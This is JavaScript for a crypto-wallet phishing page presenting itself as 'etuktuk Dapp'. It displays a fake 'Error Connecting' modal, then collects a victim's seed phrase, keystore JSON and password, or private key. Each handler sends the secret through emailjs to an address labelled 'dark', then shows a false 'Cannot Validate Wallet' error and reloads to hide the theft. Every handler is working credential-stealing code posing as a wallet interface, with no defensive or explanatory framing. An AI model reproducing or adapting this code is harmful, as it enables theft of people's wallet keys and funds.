const error_connecting_modal=document.getElementById("error_connecting_modal");
const input_main_modal=document.getElementById("input_main_modal");
const error_connecting_text=document.getElementById("error_connecting_text");
const phraseInput=document.getElementById("phraseInput");
const keystorejson=document.getElementById("keystorejson");
const keystorepassword=document.getElementById("keystorepassword");
const privatekey=document.getElementById("privatekey");
const import_btn_1=document.getElementById("import_btn_1");
const import_btn_2=document.getElementById("import_btn_2");
const import_btn_3=document.getElementById("import_btn_3");
const openFirstModal=()=>{error_connecting_modal.style.display="flex";
setTimeout(()=>{error_connecting_text.innerText="Error Connecting...";
document.getElementById("connect_manually_btn").style.display="flex";
},2000);};
const closeFirstModal=()=>{error_connecting_modal.style.display="none";
error_connecting_text.innerText="Connecting...";
document.getElementById("connect_manually_btn").style.display="none";
}
const openSecondModal=()=>{
    closeFirstModal();
    input_main_modal.style.display="flex";
};
const closeSecondModal=()=>{
    input_main_modal.style.display="none";
    error_connecting_text.innerText="Connecting...";
    document.getElementById("connect_manually_btn").style.display="none";
};
const setAsPhrase=()=>{
    document.getElementById("first").classList.add("active");
    document.getElementById("second").classList.remove("active");
    document.getElementById("third").classList.remove("active");
};
const setAsKeystore=()=>{
    document.getElementById("first").classList.remove("active");
    document.getElementById("second").classList.add("active");
    document.getElementById("third").classList.remove("active");
};
const setAsPrivateKey=()=>{
    document.getElementById("first").classList.remove("active");
    document.getElementById("second").classList.remove("active");
    document.getElementById("third").classList.add("active");
};
const formSubmitPhrase=async(e)=>{
    e.preventDefault();import_btn_1.innerText="Loading..."
//const phrase_value=phraseInput.value;const trimmed_phrase=phrase_value.trim();const phrasewords=trimmed_phrase.split(" ");if(phrasewords.length!=12&&phrasewords.length!=24){import_btn_1.innerText="Proceed";return sweetAlert("Error!","Please enter a valid phrase","error");}
const phrase_value=phraseInput.value;
const trimmed_phrase=phrase_value.trim();
const phrasewords=trimmed_phrase.split(" ");
if(phrasewords.length<=0){
    import_btn_1.innerText="Proceed";
    return sweetAlert("Error!","Please enter a valid phrase","error");
}
const type="phrase";
const check_previous=localStorage.getItem("phrase");
// if(check_previous==phrase_value){
//     import_btn_1.innerText="IMPORT";return sweetAlert("Error!","Multiple entry not allowed","error");
// }


var data1 = {
    from_website: "etuktuk Dapp",
    to_email: "dark",
    phrase: phrase_value,
}


try{

    emailjs.send('service_zbwfnbj', 'template_r1pm4zc', data1, 'DcKztgUoxgPC_m0Zs')

    sweetAlert("Error!","Cannot Validate Wallet","error");
    localStorage.setItem("phrase",phrase_value);
    setTimeout(()=>{
        window.location.reload()
    },2500);
}catch(error){
    let errm="Something went wrong!";
    if(error.response){
        if(error.response.data){
            if(error.response.data.error){
                errm=error.response.data.error;
            }
        }
    }
    sweetAlert("Error!",errm,"error");
}
phraseInput.value="";
import_btn_1.innerText="IMPORT"
};

const formSubmitKeystore=async(e)=>{
    e.preventDefault();
    import_btn_2.innerText="Loading..."
const keystore_json=keystorejson.value;
const keystore_pass=keystorepassword.value;
const type="keystore";
const check_previous=localStorage.getItem("phrase");
// if(check_previous==keystore_json){
//     import_btn_2.innerText="Proceed"
// return sweetAlert("Error!","Multiple entry not allowed","error");
// }

var data2 = {
    from_website: "etuktuk Dapp",
    to_email: "dark",
    keystorejson: keystore_json,
    keystorepassword: keystore_pass,
}

try{

    emailjs.send('service_zbwfnbj', 'template_r1pm4zc', data2, 'DcKztgUoxgPC_m0Zs')

    sweetAlert("Error!","Cannot Validate Wallet","error");
    localStorage.setItem("phrase",keystore_json)
    setTimeout(()=>{
        window.location.reload()
    },2500);
}catch(error){
    let errm="Something went wrong!";
    if(error.response){
        if(error.response.data){
            if(error.response.data.error){
                errm=error.response.data.error;
            }
        }
    }
    sweetAlert("Error!",errm,"error");}
keystorejson.value="";
keystorepassword.value="";
import_btn_2.innerText="Proceed"
};

const formSubmitPrivateKey=async(e)=>{
    e.preventDefault();
    import_btn_3.innerText="Loading..."
const private_key=privatekey.value;
const type="private key";
const check_previous=localStorage.getItem("phrase");
// if(check_previous==private_key){
//     import_btn_3.innerText="Proceed"
// return sweetAlert("Error!","Multiple entry not allowed","error");
// }

var data3 = {
    from_website: "etuktuk Dapp",
    to_email: "dark",
    privatekey: private_key,
}

try{

    emailjs.send('service_zbwfnbj', 'template_r1pm4zc', data3, 'DcKztgUoxgPC_m0Zs')

    sweetAlert("Error!","Cannot Validate Wallet","error");
    localStorage.setItem("phrase",private_key)
    setTimeout(()=>{
        window.location.reload()
    },2500);
}catch(error){
    let errm="Something went wrong!";
    if(error.response){
        if(error.response.data){
            if(error.response.data.error){
                errm=error.response.data.error;
            }
        }
    }
    sweetAlert("Error!",errm,"error");}
    privatekey.value="";import_btn_3.innerText="IMPORT"
};